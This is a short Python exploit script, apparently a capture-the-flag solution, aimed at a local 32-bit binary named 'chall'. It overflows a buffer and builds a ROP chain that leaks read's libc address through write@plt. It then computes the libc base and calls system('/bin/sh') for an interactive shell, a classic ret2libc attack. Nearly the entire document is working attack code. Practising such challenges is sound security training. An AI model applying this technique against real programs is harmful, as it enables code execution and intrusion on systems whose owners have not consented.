from roppy import *


p = process("./chall")
elf = ELF("chall")
libc = elf.libc
context.log_level = 'info'

payload = b"A"*13
payload += p32(elf.plt['write'])
payload += p32(elf.symbols['main'])
payload += p32(1)
payload += p32(elf.got['read'])
payload += p32(0x8)

p.sendline(payload)

read_leaked = u32(p.recv()[:4].strip().ljust(4, b"\x00"))

log.info("read@libc: "+hex(read_leaked))

libc.address = read_leaked - libc.symbols['read']

system = libc.symbols['system']
bin_sh = libc.search(b"/bin/sh\x00")
log.info("system@libc: "+hex(system))
log.info("binsh@libc: "+hex(bin_sh))
payload = b"A"*13
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(bin_sh)

p.sendline(payload)
p.interactive()
